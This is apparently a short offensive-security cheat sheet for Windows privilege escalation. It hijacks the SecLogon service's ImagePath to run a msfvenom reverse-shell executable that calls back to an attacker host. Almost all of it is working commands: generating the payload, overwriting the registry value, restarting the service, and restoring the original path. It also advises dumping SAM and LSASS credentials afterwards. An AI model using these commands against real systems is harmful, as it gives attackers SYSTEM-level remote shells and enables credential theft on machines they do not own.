> We will change a service's `imagepath`. This service has to run as `NT Authority\system` or `Administrator`(very rare), and has to be able to be start/stop by normal user. One candidate is `SecLogon`

## Exploit

### Query image path

Save the output. This is a destructive attack, so we have to revert our modification.

```cmd
reg query hklm\SYSTEM\CurrentControlSet\Services\SecLogon /v imagepath
```

### Generate revshell

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=9001 -f exe -o shell.exe
```

After this, upload the executable to target machine at `C:\windows\Temp` or any location you want

### Change image path

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecLogon" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\shell.exe" /f
```

### Restart service

```cmd
sc.exe stop SecLogon
sc.exe start SecLogon
```

After this, you should have a reverse shell, dump `SAM`, `LSASS`, etc and move on quick

### Revert change

Use the output from when we first query the `ImagePath`. Each system might be a bit different, idk

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecLogon" /v ImagePath /t REG_EXPAND_SZ /d "%windir%\system32\svchost.exe -k netsvcs -p" /f
```
